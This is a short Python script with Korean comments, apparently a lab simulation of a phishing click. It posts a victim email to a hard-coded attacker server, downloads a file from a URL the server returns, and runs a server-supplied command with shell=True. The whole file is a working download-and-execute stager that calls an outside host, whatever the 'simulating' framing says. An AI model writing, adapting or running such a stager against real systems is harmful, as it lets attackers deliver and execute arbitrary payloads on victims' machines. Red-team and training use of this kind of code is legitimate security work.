import urllib.request
import urllib.parse
import json
import subprocess


ATTACKER_URL = "http://192.168.56.1:34444/login"


def http_post(url, data_dict):
    """requests 없이 POST 요청 보내고 데이터 반환"""
    data = urllib.parse.urlencode(data_dict).encode("utf-8")
    req = urllib.request.Request(url, data=data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req) as response:
        return response.read().decode("utf-8")


def http_get(url):
    """requests 없이 GET 요청 반환"""
    with urllib.request.urlopen(url) as response:
        return response.read()


def download_file(url, save_path):
    """파일 다운로드 (urllib만 사용)"""
    with urllib.request.urlopen(url) as response:
        data = response.read()
        with open(save_path, "wb") as f:
            f.write(data)
    return save_path


def main():
    print("[*] Simulating phishing click...")

    # 1) POST 요청으로 공격자 서버에 클릭 이벤트 전달
    response_text = http_post(ATTACKER_URL, {"user": "victim@example.com"})
    print("[+] Server response:", response_text)

    # 2) JSON 파싱
    response = json.loads(response_text)

    download_url = response["download_url"]
    file_name = response["file_name"]
    execute_cmd = response["execute"]

    print(f"[+] Download URL: {download_url}")
    print(f"[+] Saving as: {file_name}")

    # 3) 파일 다운로드
    download_file(download_url, file_name)
    print("[+] File downloaded successfully.")

    # 4) 실행
    print(f"[+] Executing: {execute_cmd}")
    subprocess.Popen(execute_cmd, shell=True)


if __name__ == "__main__":
    main()
